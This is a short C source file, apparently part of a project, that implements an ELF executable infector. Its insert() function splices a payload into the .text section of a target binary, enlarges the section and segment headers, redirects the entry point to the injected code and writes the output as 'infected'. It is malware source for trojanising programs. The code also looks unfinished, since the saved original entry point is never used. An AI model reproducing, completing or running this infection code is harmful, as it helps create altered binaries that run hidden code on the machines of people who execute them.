#include <stdint.h>
#include <elf.h>
#include <stdlib.h>
#include <log.h>

#include "elf-parser.h"
#include "utils.h"

/*
 * Insert the _dest_ array into the ELF file
 * _dest_ in an executable section
 */
void insert(byte *dest, byte *src, uint64_t dest_size, uint16_t src_size) {

    byte *final_product = NULL;
    Elf64_Phdr *seg = get_exe_segment();
    Elf64_Addr old_entry = get_entry_point();			// To use later

    /* First we find the section .text */
    Elf64_Shdr *text = get_section_by_name(".text");
    if (text == NULL) {
	ERROR("Can't find the section .text", NULL);
    }

    /* Then we find the segment that contains the text section */
    for (; seg != NULL; seg = get_exe_segment()) {
	if (section_in_segment(text, seg)) {
	    break;
	}
    }

    /* Now we update the entry point */
    set_entry_point(text->sh_addr + text->sh_size);

    /* TMP */
    add_offset(text->sh_offset, src_size);

    /* Now we update the size of this segment/section */
    text->sh_size += src_size;
    seg->p_filesz += src_size;
    seg->p_memsz  += src_size;

    /* We allocate a new buffer for the new executable */
    final_product = calloc(dest_size + src_size, sizeof(byte));
    SUCCESS("Allocation of 0x%x bytes", dest_size + src_size);
    /* We fill this new binary buffer */
    /* First we fill the content until we arrive to the place of the code we add */
    uint64_t i = 0;
    uint64_t j = 0;
    SUCCESS("Write the first 0x%x bytes", text->sh_offset + text->sh_size - src_size);
    for (; i < text->sh_offset + text->sh_size - src_size; i++) {
	final_product[i] = dest[i];
    }
    /* Then we insert the payload */
    for (; j < src_size; j++) {
	final_product[i + j] = src[j];
    }
    /* Finally we finish we the rest of the target content */
    for (; i < dest_size; i++) {
	final_product[i + j] = dest[i];
    }
    write_file("infected", final_product, dest_size + src_size);
}
